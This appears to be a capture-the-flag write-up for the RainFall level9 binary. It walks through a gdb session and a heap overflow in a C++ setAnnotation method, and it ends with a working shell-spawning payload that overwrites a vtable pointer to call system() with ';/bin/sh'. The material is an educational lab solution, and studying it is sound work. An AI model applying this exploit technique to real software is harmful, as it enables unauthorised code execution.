```diff
+level9@RainFall:~$ gdb ./level9
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
...
Reading symbols from /home/user/level9/level9...(no debugging symbols found)...done.
+(gdb) b main
Breakpoint 1 at 0x80485f8
+(gdb) r
Starting program: /home/user/level9/level9

Breakpoint 1, 0x080485f8 in main ()
+(gdb) p system
$1 = {<text variable, no debug info>} 0xb7d86060 <system>
+(gdb) q
```

## System Address (Little Endian)
```
address         =   0xb7d86060
little indian   =   "\x60\x60\xd8\xb7"
```

---

### 1. Vulnerability Analysis

A heap-based buffer overflow vulnerability was identified in the `setAnnotation` method of the `N` class in `level9.cpp`. The `memcpy` function does not validate the size of the user-controlled input (`text`) against the 100-byte capacity of the destination buffer (`annotation`).

This allows an overflow from the `n1` object, which is allocated first on the heap, into the subsequently allocated `n2` object. This overwrite capability allows for the modification of the `vptr` (Virtual Function Table Pointer) of the `n2` object.

### 2. Exploitation Strategy

The exploit strategy is comprised of two phases:

**Phase 1: Control Flow Hijacking**

The primary objective is to redirect the virtual function call (`*n2 + *n1`) to the `system()` function within the `libc` library. This is achieved by overwriting the `vptr` of `n2` to point to a controlled address. This address, assumed to be a static heap location (`0x0804a00c`), is the start of the `n1->annotation` buffer, which is repurposed as a "Fake Vtable". The first entry of this fake vtable is set to the address of the `system()` function (`0xb7d86060`).

**Phase 2: Command Injection via Argument Manipulation**

A key challenge is that the hijacked call results in `system(&n1)`, where the argument is a pointer to the `n1` object, not a valid command string. This is bypassed by leveraging a feature of the `/bin/sh` shell, which is invoked by `system()`. The semicolon character (`;`) is a command separator.

By injecting the string `;/bin/sh` into the payload, the argument passed to the shell becomes `"[GARBAGE_DATA];/bin/sh"`. The shell fails to execute the initial garbage data but then proceeds to execute the valid command `/bin/sh` after the separator, thus launching a new shell.

### 3. Final Payload

The final working payload that implements this strategy is constructed as follows:

```bash
./level9 $(python -c 'print "\x60\x60\xd8\xb7" + "A" * 104 + "\x0c\xa0\x04\x08" + ";/bin/sh"')
```

This payload contains the following critical components:

- **`system()` Function Address (`0xb7d86060`):** The target function for redirection.
- **Padding (`"A" * 104`):** Bytes used to reach and align the overwrite.
- **Target Memory Address (`0x0804a00c`):** The static heap address used to point to the controlled data.
- **Command Injection (`;/bin/sh`):** The command separator and payload to acquire a shell.